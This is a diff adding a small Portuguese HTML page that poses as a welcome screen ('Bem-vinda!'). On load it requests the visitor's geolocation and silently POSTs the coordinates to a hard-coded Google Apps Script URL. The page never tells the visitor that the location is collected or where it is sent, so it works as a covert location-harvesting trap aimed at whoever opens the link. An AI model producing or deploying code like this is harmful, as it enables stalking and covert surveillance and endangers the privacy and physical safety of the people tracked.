@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Localização Automática</title>
+    
+</head>
+<body onload="saveLocation()">
+    <h1>Bem-vinda!</h1>
+    <p id="status">Obtendo localização...</p>
+
+    
+</body>
+</html>
+<script>
+function saveLocation() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(async (position) => {
+            const data = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude
+            };
+
+            // Substitua pelo URL de implantação do seu aplicativo do Google Apps Script
+            const url = "https://script.google.com/macros/s/AKfycbxRlArWpOwYd3z9Dk5k7n7_hFpyyIrQY9HVSUOpAJKU5owcG6smX3xJTIz4v_KzNQfa/exec";
+
+            try {
+                const response = await fetch(url, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(data)
+                });
+
+                const result = await response.text();
+                document.getElementById("status").innerText = result;
+            } catch (error) {
+                document.getElementById("status").innerText = "Erro ao salvar localização.";
+            }
+        }, () => {
+            document.getElementById("status").innerText = "Erro ao obter localização.";
+        });
+    } else {
+        document.getElementById("status").innerText = "Geolocalização não suportada.";
+    }
+}
+
+
+
+
+</script>
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: Arial, sans-serif;
+}
+
+body {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    background: #f0f0f5;
+    text-align: center;
+}
+
+h1 {
+    margin-bottom: 20px;
+}
+
+button, input {
+    padding: 10px 20px;
+    margin: 10px 0;
+    font-size: 16px;
+}
+
+#status, #result {
+    margin-top: 15px;
+    color: green;
+}
+
+
+</style>
